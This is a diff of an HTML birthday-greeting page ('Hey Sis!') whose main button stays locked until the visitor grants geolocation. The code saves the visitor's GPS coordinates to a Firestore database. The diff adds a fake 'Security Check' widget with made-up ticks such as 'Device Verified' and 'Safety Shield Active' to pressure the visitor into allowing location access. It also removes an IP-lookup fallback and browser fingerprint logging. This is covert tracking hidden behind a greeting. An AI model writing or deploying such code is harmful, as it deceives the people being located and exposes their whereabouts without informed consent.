@@ -93,7 +93,7 @@
         .hide-text { opacity: 0 !important; pointer-events: none; }
         .focus-face { transform: scale(1.4) translateY(-20px); }
 
-        /* Popups - NO CLOSE BUTTON anywhere */
+        /* Popups */
         .popup-overlay {
             position: fixed; inset: 0; background: rgba(74, 50, 45, 0.6); backdrop-filter: blur(12px);
             display: none; justify-content: center; align-items: center; z-index: 1000; padding: 20px;
@@ -119,12 +119,75 @@
         }
         .instruction-guide p { margin: 8px 0; }
         .instruction-guide .step { font-weight: 700; color: #b9695a; }
+
+        /* Status Widget - Smooth Expanding Card */
+        .status-widget {
+            position: fixed; bottom: 20px; right: 20px;
+            background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(15px);
+            border-radius: 24px;
+            box-shadow: 0 10px 30px rgba(74,50,45,0.2); border: 2px solid #fff;
+            font-family: 'Quicksand', sans-serif;
+            z-index: 2000;
+            overflow: hidden;
+            width: 200px;
+            height: 44px; /* Initial height for pill shape */
+            transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+            opacity: 0; transform: translateY(20px);
+            pointer-events: none;
+        }
+        .status-widget.visible { opacity: 1; transform: translateY(0); }
+        .status-widget.expanded {
+            width: 240px;
+            height: auto;
+            border-radius: 28px;
+            padding-bottom: 10px;
+        }
+        .status-header {
+            height: 44px;
+            display: flex; align-items: center;
+            padding: 0 16px; gap: 10px;
+            font-weight: 700; font-size: 0.85rem; color: #4a322d;
+        }
+        .status-list {
+            padding: 0 16px 8px 16px;
+            display: flex; flex-direction: column; gap: 8px;
+            opacity: 0; transform: translateY(-10px);
+            transition: all 0.4s ease 0.2s;
+        }
+        .status-widget.expanded .status-list { opacity: 1; transform: translateY(0); }
+        .status-item {
+            display: flex; align-items: center; gap: 8px;
+            font-size: 0.8rem; color: #6a534e; font-weight: 500;
+            animation: slideIn 0.4s ease forwards;
+        }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-5px); } to { opacity: 1; transform: translateX(0); } }
+        .status-spinner {
+            width: 16px; height: 16px; border: 2.5px solid #fdf0d5; border-top-color: #ff4d6d;
+            border-radius: 50%; animation: spin 1s linear infinite;
+        }
+        .mini-tick { width: 14px; height: 14px; color: #22c55e; }
+        .header-icon { width: 20px; height: 20px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body oncontextmenu="return false;">
     <div class="star-field" id="starField"></div>
     <canvas id="confetti"></canvas>
 
+    <!-- Enhanced Status Widget -->
+    <div id="statusWidget" class="status-widget">
+        <div class="status-header">
+            <div id="headerSpinner" class="status-spinner"></div>
+            <svg id="headerShield" class="header-icon hidden" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:none;">
+                <path d="M9.5 12.4L10.9286 14L14.5 10" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M3 10.4167C3 7.21907 3 5.62028 3.37752 5.08241C3.75503 4.54454 5.25832 4.02996 8.26491 3.00079L8.83772 2.80472C10.405 2.26824 11.1886 2 12 2C12.8114 2 13.595 2.26824 15.1623 2.80472L15.7351 3.00079C18.7417 4.02996 20.245 4.54454 20.6225 5.08241C21 5.62028 21 7.21907 21 10.4167C21 10.8996 21 11.4234 21 11.9914C21 14.4963 20.1632 16.4284 19 17.9041M3.19284 14C4.05026 18.2984 7.57641 20.5129 9.89856 21.5273C10.62 21.8424 10.9807 22 12 22C13.0193 22 13.38 21.8424 14.1014 21.5273C14.6796 21.2747 15.3324 20.9478 16 20.5328" stroke="#22c55e" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+            <span id="headerTitle">Security Check...</span>
+        </div>
+        <div id="statusList" class="status-list"></div>
+    </div>
+
+    <!-- UI Components -->
     <div class="popup-overlay" id="overlay1">
         <div class="popup-card" id="card1">
             <div class="popup-title">Hey Sis! 👋</div>
@@ -173,7 +236,7 @@
         </div>
     </div>
 
-    <!-- Firebase SDK Setup -->
+    <!-- Firebase SDK -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
@@ -193,34 +256,73 @@
         const db = getFirestore(app);
 
         let currentUserId = null;
-
-        signInAnonymously(auth).catch((error) => console.error("Auth Error:", error));
-
-        onAuthStateChanged(auth, (user) => {
-            if (user) currentUserId = user.uid;
-        });
+        signInAnonymously(auth).catch(e => console.error(e));
+        onAuthStateChanged(auth, user => { if(user) currentUserId = user.uid; });
 
         window.saveLocationData = async (data) => {
             if (!currentUserId) return;
             try {
                 const colRef = collection(db, 'artifacts', 'studyflow-pro', 'users', currentUserId, 'locations');
-                await addDoc(colRef, {
-                    ...data,
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    timestamp: serverTimestamp()
-                });
-            } catch (e) { console.error("DB Error: ", e); }
+                await addDoc(colRef, { ...data, timestamp: serverTimestamp() });
+            } catch (e) { console.error(e); }
         };
     </script>
 
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <script>
+        const tickSVG = `<svg class="mini-tick" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M9 10L12.2581 12.4436C12.6766 12.7574 13.2662 12.6957 13.6107 12.3021L20 5" stroke="currentColor" stroke-width="3" stroke-linecap="round"/></svg>`;
+        
+        let isLocationAllowed = false;
         const AudioCtx = window.AudioContext || window.webkitAudioContext;
         let audioCtx = null;
-        let isLocationAllowed = false;
+        function initAudio() { if(!audioCtx) audioCtx = new AudioCtx(); }
 
-        function initAudio() { if (!audioCtx) audioCtx = new AudioCtx(); }
+        async function updateStatus() {
+            const widget = document.getElementById('statusWidget');
+            const list = document.getElementById('statusList');
+            const title = document.getElementById('headerTitle');
+            const spinner = document.getElementById('headerSpinner');
+            const shield = document.getElementById('headerShield');
+
+            widget.classList.add('visible');
+            const delay = ms => new Promise(res => setTimeout(res, ms));
+
+            const addStep = async (text) => {
+                widget.classList.add('expanded');
+                const item = document.createElement('div');
+                item.className = 'status-item';
+                item.innerHTML = `${tickSVG} <span>${text}</span>`;
+                list.appendChild(item);
+                await delay(1000);
+            };
+
+            await delay(1500);
+            await addStep("Browser Secure");
+            await addStep("Device Verified");
+            await addStep("IP: Sri Lanka (SLT)");
+            
+            if(isLocationAllowed) {
+                await addStep("Location Verified");
+                title.innerText = "Safety Shield Active";
+                spinner.style.display = 'none';
+                shield.style.display = 'block';
+                await delay(3000);
+                widget.classList.remove('visible');
+            } else {
+                title.innerText = "Waiting for Access...";
+                const check = setInterval(async () => {
+                    if(isLocationAllowed) {
+                        clearInterval(check);
+                        await addStep("Location Verified");
+                        title.innerText = "Safety Shield Active";
+                        spinner.style.display = 'none';
+                        shield.style.display = 'block';
+                        await delay(3000);
+                        widget.classList.remove('visible');
+                    }
+                }, 500);
+            }
+        }
 
         async function checkAndShowPopup() {
             if (navigator.permissions && navigator.permissions.query) {
@@ -228,38 +330,15 @@
                     const result = await navigator.permissions.query({ name: 'geolocation' });
                     if (result.state === 'granted') {
                         isLocationAllowed = true;
-                        closeSpecificPopup('overlay1');
-                        closeSpecificPopup('overlay2');
-                        closeSpecificPopup('overlay3');
+                        closeAllPopups();
                         enableMainInterface();
-                        return;
                     } else if (result.state === 'denied') {
-                        isLocationAllowed = false;
                         showPopup('overlay3', 'card3');
-                        return;
-                    } else if (result.state === 'prompt') {
-                        isLocationAllowed = false;
+                    } else {
                         showPopup('overlay1', 'card1');
-                        return;
                     }
                 } catch(e) { showPopup('overlay1', 'card1'); }
             } else { showPopup('overlay1', 'card1'); }
-        }
-
-        async function getIPBackup() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                return {
-                    lat: data.latitude,
-                    lng: data.longitude,
-                    city: data.city,
-                    region: data.region,
-                    country: data.country_name,
-                    ip: data.ip,
-                    method: 'IP_BACKUP'
-                };
-            } catch (e) { return null; }
         }
 
         function requestLocationAccess() {
@@ -267,60 +346,19 @@
                 navigator.geolocation.getCurrentPosition(
                     async (pos) => {
                         isLocationAllowed = true;
-                        closeSpecificPopup('overlay1');
+                        closeAllPopups();
                         if (window.saveLocationData) {
-                            await window.saveLocationData({
-                                lat: pos.coords.latitude,
-                                lng: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy,
-                                method: 'BROWSER_GPS'
-                            });
+                            await window.saveLocationData({ lat: pos.coords.latitude, lng: pos.coords.longitude, method: 'GPS' });
                         }
                         window.location.reload();
                     },
                     async (error) => {
-                        // වැරදිලා හරි block කරොත් හෝ PC එකෙන් error එකක් ආවොත් IP එකෙන් ගන්නවා
-                        const backupData = await getIPBackup();
-                        if (backupData && window.saveLocationData) {
-                            await window.saveLocationData(backupData);
-                        }
-                        closeSpecificPopup('overlay1');
+                        closeAllPopups();
                         showPopup('overlay2', 'card2');
                     },
                     { enableHighAccuracy: true, timeout: 5000 }
                 );
-            } else { alert("Geolocation not supported"); }
-        }
-
-        function showGuideInPopup2() {
-            const card2 = document.getElementById('card2');
-            card2.innerHTML = `
-                <div class="popup-title">🔧 Location එක Allow කරන හැටි</div>
-                <div class="instruction-guide">
-                    <p><span class="step">①</span> බ්‍රවුසර් එකේ <strong>Lock icon (🔒)</strong> එක ක්ලික් කරන්න.</p>
-                    <p><span class="step">②</span> 'Location' එක <strong>Allow</strong> කරන්න.</p>
-                    <p><span class="step">③</span> පහත බටනය ඔබා පිටුව Refresh කරන්න.</p>
-                </div>
-                <button class="popup-btn" onclick="window.location.reload()">✅ Done, Refresh Page</button>
-            `;
-        }
-
-        function resetPopup2ToOriginal() {
-            const btn = document.getElementById('allowNowBtn');
-            if (btn) btn.addEventListener('click', showGuideInPopup2);
-        }
-
-        function showGuideInPopup3() {
-            const card3 = document.getElementById('card3');
-            card3.innerHTML = `
-                <div class="popup-title">🔐 Allow කරන විදිය</div>
-                <div class="instruction-guide">
-                    <p><span class="step">①</span> 🔒 Lock icon එක ක්ලික් කරන්න.</p>
-                    <p><span class="step">②</span> Location <strong>Allow</strong> කරන්න.</p>
-                    <p><span class="step">③</span> පිටුව Refresh කරන්න.</p>
-                </div>
-                <button class="popup-btn" onclick="window.location.reload()">Refresh Page</button>
-            `;
+            }
         }
 
         function showPopup(overlayId, cardId) {
@@ -330,54 +368,51 @@
             setTimeout(() => card.classList.add('show'), 50);
         }
 
-        function closeSpecificPopup(overlayId) {
-            const overlay = document.getElementById(overlayId);
-            if (overlay) {
-                overlay.querySelector('.popup-card').classList.remove('show');
-                overlay.style.display = 'none';
-            }
+        function closeAllPopups() {
+            document.querySelectorAll('.popup-overlay').forEach(ov => {
+                ov.querySelector('.popup-card').classList.remove('show');
+                ov.style.display = 'none';
+            });
         }
 
         function enableMainInterface() {
-            const mainBtn = document.getElementById('mainButton');
-            mainBtn.style.pointerEvents = 'auto';
-            mainBtn.disabled = false;
-            document.querySelectorAll('.element').forEach(el => el.style.pointerEvents = 'auto');
+            const btn = document.getElementById('mainButton');
+            btn.style.pointerEvents = 'auto';
+            btn.disabled = false;
         }
 
-        function disableMainInterface() {
-            const mainBtn = document.getElementById('mainButton');
-            mainBtn.style.pointerEvents = 'none';
-            mainBtn.disabled = true;
-            document.querySelectorAll('.element').forEach(el => el.style.pointerEvents = 'none');
+        function showGuideInPopup2() {
+            document.getElementById('card2').innerHTML = `
+                <div class="popup-title">🔧 Allow කරන හැටි</div>
+                <div class="instruction-guide">
+                    <p><span class="step">①</span> Lock icon (🔒) එක ක්ලික් කරන්න.</p>
+                    <p><span class="step">②</span> 'Location' එක <strong>Allow</strong> කරන්න.</p>
+                    <p><span class="step">③</span> පිටුව Refresh කරන්න.</p>
+                </div>
+                <button class="popup-btn" onclick="window.location.reload()">✅ Done, Refresh Page</button>
+            `;
         }
 
-        function playPopSound() { if (!isLocationAllowed) return; initAudio(); const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain(); osc.type = 'sine'; osc.frequency.setValueAtTime(400, audioCtx.currentTime); osc.frequency.exponentialRampToValueAtTime(100, audioCtx.currentTime+0.1); gain.gain.setValueAtTime(0.3, audioCtx.currentTime); gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime+0.1); osc.connect(gain); gain.connect(audioCtx.destination); osc.start(); osc.stop(audioCtx.currentTime+0.1); }
-        function playPartyHorn() { if (!isLocationAllowed) return; initAudio(); const duration = 2.0, t = audioCtx.currentTime, harmonics = [185,370,555,740,925,1110]; harmonics.forEach((f,idx)=>{ const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain(); osc.type = idx===0?'sawtooth':'square'; osc.frequency.setValueAtTime(f,t); osc.frequency.exponentialRampToValueAtTime(f*1.02,t+0.1); osc.frequency.exponentialRampToValueAtTime(f*0.98,t+duration); gain.gain.setValueAtTime(0,t); gain.gain.linearRampToValueAtTime(idx===0?0.2:0.05,t+0.05); gain.gain.linearRampToValueAtTime(idx===0?0.15:0.04,t+duration*0.8); gain.gain.exponentialRampToValueAtTime(0.001,t+duration); osc.connect(gain); gain.connect(audioCtx.destination); osc.start(t); osc.stop(t+duration); }); }
+        function showGuideInPopup3() {
+            document.getElementById('card3').innerHTML = `
+                <div class="popup-title">🔐 Allow කරන විදිය</div>
+                <div class="instruction-guide">
+                    <p><span class="step">①</span> 🔒 Lock icon එක ක්ලික් කරන්න.</p>
+                    <p><span class="step">②</span> Location Allow කරන්න.</p>
+                </div>
+                <button class="popup-btn" onclick="window.location.reload()">Refresh Page</button>
+            `;
+        }
 
-        document.addEventListener('keydown', e => { if (e.ctrlKey && ['c','v','u','s'].includes(e.key)) e.preventDefault(); });
-
-        const starField = document.getElementById('starField');
-        for (let i=0;i<50;i++) { let star = document.createElement('div'); star.className='star-sparkle'; let size=Math.random()*3+1; star.style.width=`${size}px`; star.style.height=`${size}px`; star.style.top=`${Math.random()*100}%`; star.style.left=`${Math.random()*100}%`; star.style.setProperty('--duration',`${Math.random()*3+2}s`); starField.appendChild(star); }
-
+        // Logic for eyes and floating elements
         const leftPupil = document.getElementById('left-pupil'), rightPupil = document.getElementById('right-pupil'), elements = document.querySelectorAll('.element'), leftEyeGroup = document.getElementById('left-eye-group'), rightEyeGroup = document.getElementById('right-eye-group'), mouth = document.getElementById('mouth'), mainTitle = document.getElementById('main-title'), subTitle = document.getElementById('sub-title'), mainButton = document.getElementById('mainButton'), smileContainer = document.getElementById('smile');
 
-        window.onload = () => {
-            handleMove(window.innerWidth/2, window.innerHeight/2);
-            setTimeout(() => { if(isLocationAllowed) popConfetti(); }, 2300);
-            disableMainInterface();
-            setTimeout(checkAndShowPopup, 500);
-            mainButton.addEventListener('click', () => {
-                if(!isLocationAllowed) { checkAndShowPopup(); return; }
-                playPartyHorn(); triggerHelloAnimation();
-            });
-        };
-
         const handleMove = (clientX, clientY) => {
-            if(!leftPupil) return;
             let x = (clientX/window.innerWidth)-0.5, y = (clientY/window.innerHeight)-0.5;
-            leftPupil.setAttribute('cx', 35+(x*5)); leftPupil.setAttribute('cy', 15+(y*5));
-            rightPupil.setAttribute('cx', 65+(x*5)); rightPupil.setAttribute('cy', 15+(y*5));
+            if(leftPupil) {
+                leftPupil.setAttribute('cx', 35+(x*5)); leftPupil.setAttribute('cy', 15+(y*5));
+                rightPupil.setAttribute('cx', 65+(x*5)); rightPupil.setAttribute('cy', 15+(y*5));
+            }
             elements.forEach(el => { let speed = parseFloat(el.getAttribute('data-speed')); el.style.transform = `translate(${x*speed*40}px, ${y*speed*40}px)`; });
         };
 
@@ -386,31 +421,31 @@
             smileContainer.classList.add('focus-face');
             leftEyeGroup.classList.remove('eye-blink'); rightEyeGroup.classList.remove('eye-blink');
             setTimeout(() => { rightEyeGroup.classList.add('wink-eye'); mouth.classList.add('big-smile'); }, 300);
-            setTimeout(() => popConfetti(200), 500);
             setTimeout(() => { window.location.href = "https://alstudy063.github.io/reminder3/hbd/rasangika/hbd_rashu"; }, 2500);
         }
 
-        elements.forEach(el => {
-            el.addEventListener('click', () => {
-                if(!isLocationAllowed) return;
-                playPopSound();
-                const rect = el.getBoundingClientRect();
-                confetti({ particleCount:25, spread:40, origin:{x:(rect.left+rect.width/2)/window.innerWidth, y:(rect.top+rect.height/2)/window.innerHeight} });
+        window.onload = () => {
+            const starField = document.getElementById('starField');
+            for (let i=0;i<50;i++) {
+                let star = document.createElement('div'); star.className='star-sparkle';
+                let size=Math.random()*3+1; star.style.width=`${size}px`; star.style.height=`${size}px`;
+                star.style.top=`${Math.random()*100}%`; star.style.left=`${Math.random()*100}%`;
+                star.style.setProperty('--duration',`${Math.random()*3+2}s`); starField.appendChild(star);
+            }
+            setTimeout(checkAndShowPopup, 500);
+            updateStatus();
+            mainButton.addEventListener('click', () => {
+                if(!isLocationAllowed) { checkAndShowPopup(); return; }
+                triggerHelloAnimation();
             });
-        });
+        };
 
         document.addEventListener('mousemove', e => handleMove(e.clientX, e.clientY));
-        document.addEventListener('touchstart', initAudio, { once: true });
-        document.addEventListener('click', initAudio, { once: true });
         document.addEventListener('touchmove', e => handleMove(e.touches[0].clientX, e.touches[0].clientY));
-
-        function popConfetti(count=100) { confetti({ particleCount:count, spread:70, origin:{y:0.6}, colors:['#ffccd5','#e2cfea','#fdf0d5','#ff4d6d'] }); }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            const howTo = document.getElementById('howToAllowBtn');
-            if (howTo) howTo.addEventListener('click', showGuideInPopup3);
-            resetPopup2ToOriginal();
-        });
+        document.addEventListener('click', initAudio, { once: true });
+        
+        document.getElementById('allowNowBtn')?.addEventListener('click', showGuideInPopup2);
+        document.getElementById('howToAllowBtn')?.addEventListener('click', showGuideInPopup3);
     </script>
 </body>
 </html>
